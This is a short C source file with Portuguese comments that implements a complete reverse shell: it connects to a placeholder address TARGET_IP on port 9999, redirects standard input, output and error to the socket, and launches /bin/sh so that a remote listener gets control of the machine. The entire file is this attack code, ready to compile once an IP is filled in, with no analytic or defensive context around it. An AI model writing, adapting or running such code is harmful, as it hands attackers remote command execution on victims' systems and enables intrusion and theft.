#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

const char *ip = "TARGET_IP"; // Substitua pelo IP do seu servidor
const int port = 9999;        // Substitua pela porta do seu servidor

int main() {
    int sock;
    struct sockaddr_in server;
    char *sh = "/bin/sh";

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr
    execve(sh, NULL, NULL);

    return 0;
}
